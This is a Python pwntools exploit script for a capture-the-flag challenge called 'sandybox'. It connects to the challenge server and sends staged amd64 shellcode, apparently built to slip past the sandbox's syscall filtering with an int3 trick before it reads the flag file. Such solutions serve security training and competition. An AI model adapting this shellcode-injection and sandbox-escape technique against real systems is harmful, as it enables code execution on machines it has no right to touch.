from pwn import *
from struct import pack
from sys import argv
from os import system


###############################################################################
#### Init (copied from disconnect3d template)
###############################################################################
e = context.binary = ELF('./sandybox')


gdbscript = '''
'''

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([e.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([e.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    host = 'sandybox.pwni.ng'
    port = 1337
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

p = start()


###############################################################################
#### Exploit
###############################################################################
shellcode = asm('''
push 1000
pop rdx
xor eax, eax
syscall
''', arch='amd64')

print(len(shellcode))
assert len(shellcode) <= 10
while len(shellcode) < 10:
    shellcode += asm('''nop''', arch='amd64')

shellcode += asm('''
nop
nop
nop
nop
nop
nop
nop
mov rax, 8
int3
''', arch='amd64')

shellcode += asm(shellcraft.amd64.cat('flag'), arch='amd64')

context.log_level = 'debug'

p.send(shellcode)
p.recvall()